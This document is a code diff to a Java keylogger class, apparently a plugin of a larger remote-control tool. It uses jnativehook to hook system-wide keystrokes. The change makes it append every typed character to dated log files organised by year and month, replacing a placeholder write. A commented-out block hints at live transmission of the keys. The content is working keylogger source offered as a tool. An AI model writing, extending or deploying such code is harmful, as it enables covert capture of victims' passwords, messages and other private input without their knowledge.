@@ -9,6 +9,7 @@ import java.util.Date;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+@SuppressWarnings("deprecation")
 public class Keylogger implements NativeKeyListener {
 
 	@Override
@@ -23,11 +24,9 @@ public class Keylogger implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
-		try {
-			File file = getFile();
-			
-			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter("outfilename", true)));
-		    out.println("the text");
+		try {			
+			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(getTodaysFile(), true)));
+		    out.print(arg0.getKeyChar());
 		    out.close();
 			
 			/*if (LIVE RUNNING && KeyloggerPlugin.dos != null) {
@@ -40,21 +39,29 @@ public class Keylogger implements NativeKeyListener {
 
 	}
 
-	@SuppressWarnings("deprecation")
-	private File getFile() {
-		File mainDir = KeyloggerPlugin.getLogsRoot();
-		
+	public static File getTodaysFile() {		
 		Date date = new Date();
 		
-		File year = new File(mainDir, date.getYear() + "");
-		year.mkdirs();
-		
-		File month = new File(year, (date.getMonth() + 1) + "");
-		month.mkdirs();
-		
-		File day = new File(month, (date.getDate()) + ".log");
+		File day = new File(getMonthFolder(), (date.getDate()) + ".log");
 		
 		return day;
 	}
+	
+	public static File getMonthFolder() {
+		Date date = new Date();
 
+		File month = new File(getYearFolder(), (date.getMonth() + 1) + "");
+		month.mkdirs();
+			
+		return month;
+	}
+
+	public static File getYearFolder() {
+		Date date = new Date();
+
+		File year = new File(KeyloggerPlugin.getLogsRoot(), (date.getYear() + 1900) + "");
+		year.mkdirs();
+		
+		return year;
+	}
 }
